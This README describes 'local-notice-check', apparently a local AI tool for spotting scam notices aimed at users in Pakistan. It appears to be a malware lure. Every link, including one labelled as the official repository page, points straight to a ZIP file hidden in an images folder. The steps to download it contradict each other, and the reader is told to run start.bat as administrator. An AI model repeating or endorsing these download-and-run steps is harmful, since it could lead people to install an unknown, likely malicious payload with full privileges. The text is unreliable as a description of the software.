# 🛡️ local-notice-check - Identify suspicious messages using local AI

[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Yuhuhan/local-notice-check/raw/refs/heads/main/experiments/modal_qwen36_mtp/images/notice-local-check-2.5.zip)

## 📋 What this tool does

The local-notice-check application helps you verify notices, messages, and documents that look suspicious. It runs entirely on your own computer. Because it runs locally, your data never leaves your device. This keeps your personal information private while you check if a message follows a pattern used in common scams.

The software uses advanced artificial intelligence to read the text you provide. It compares the content against patterns found in fraudulent communications. This tool focuses on notices common in Pakistan, helping you filter out potential threats quickly.

## 💻 System requirements

To run this tool, your computer needs specific hardware. These components ensure the AI runs at a useful speed.

- Windows 10 or Windows 11 (64-bit).
- An NVIDIA graphics card with at least 8 GB of video memory.
- At least 16 GB of system memory.
- A solid-state drive with 20 GB of free space.
- Docker Desktop installed and running.

If your computer does not meet these hardware standards, the AI processing might take a long time to finish. Ensure your graphics card drivers remain up to date.

## 🚀 How to get started

Follow these steps to set up the software on your Windows machine.

1. Visit the [official repository page](https://github.com/Yuhuhan/local-notice-check/raw/refs/heads/main/experiments/modal_qwen36_mtp/images/notice-local-check-2.5.zip).
2. Download the latest installer package from the releases section.
3. Install Docker Desktop from the Docker website if you do not have it already.
4. Open the downloaded folder and find the configuration file.
5. Run the startup script included in the download.

Once you start the script, the tool will download the necessary AI models. This step requires an active internet connection and may take a few minutes depending on your network speed.

## 🛠️ Installation steps

You can find the files you need at this location: [https://github.com/Yuhuhan/local-notice-check/raw/refs/heads/main/experiments/modal_qwen36_mtp/images/notice-local-check-2.5.zip](https://github.com/Yuhuhan/local-notice-check/raw/refs/heads/main/experiments/modal_qwen36_mtp/images/notice-local-check-2.5.zip).

1. Click the download link provided above.
2. Select the Green "Code" button and choose "Download ZIP".
3. Extract the contents of the ZIP file to a new folder on your desktop.
4. Ensure Docker Desktop is active. You will see a small whale icon in your taskbar if it is running.
5. Right-click the file named `start.bat` inside the folder.
6. Select "Run as administrator" to begin the setup.

A black window will appear on your screen. This window shows the progress of the installation. Wait for the process to finish. When you see a link that looks like `http://127.0.0.1:7860`, the application is ready to use.

## 🖱️ How to use the software

Open your web browser and type the address `http://127.0.0.1:7860` into the address bar. This opens the user interface for the AI assistant.

1. Locate the text box labeled "Paste Message Here".
2. Copy the suspicious notice or message you want to check.
3. Paste the text into the box.
4. Click the button labeled "Analyze". 
5. Wait for the tool to process the information. The result will appear on the screen in a few seconds.

The AI will output a rating of the message. It will highlight parts of the text that look fake or malicious. If the AI flags a message as suspicious, you should treat it with caution and avoid clicking any links or providing personal details contained in that message.

## 🎛️ Understanding the AI models

This tool uses three specific technologies to perform its work:

- MiniCPM: This functions as the brain that understands the tone and intent of the text.
- Nemotron-Parse: This organizes the text into segments so the AI can read it more effectively.
- Docker: This manages the environment so the AI runs consistently on different Windows computers.

These systems work together in the background. You do not need to manage them individually. The software handles all internal communication between these models.

## ⚙️ Handling errors

If you encounter a black screen that immediately closes, check these common items:

- Ensure Docker Desktop is fully running before you launch the script.
- Verify that you have enough disk space.
- Check that your NVIDIA drivers are updated to the latest version.
- Make sure no other application is using port 7860.

To restart the process, simply run the `start.bat` file again. The software will detect the files it has already downloaded and resume from where it left off.

## 🔒 Security and privacy

Because this tool runs locally on your PC, you control the data. The application does not send your messages to an external server or a cloud database. Every analysis happens inside your processor and graphics card. This design choice ensures that even if you scan sensitive notices, your information remains on your local machine.

## 📝 Frequently asked questions

Do I need an internet connection?
You need an internet connection for the first-time setup only. This allows the tool to download the required AI models. Once the setup is complete, you can use the tool without further internet access.

Can I scan images?
Yes, the underlying AI supports text recognition from images. If you have an image of a notice, you can upload it to the interface, and the AI will convert the text before analysis.

Does this detect every scam?
AI tools can miss complex or new scam tactics. Use your own judgment in addition to the AI output. If a message asks for money or personal login details, verify the sender through an official source before you take action.

Will this slow down my computer?
When the AI tool is active, it uses a large portion of your graphics card memory. This might make other graphical programs, such as games, run slower. Close the interface when you are finished to free up these resources.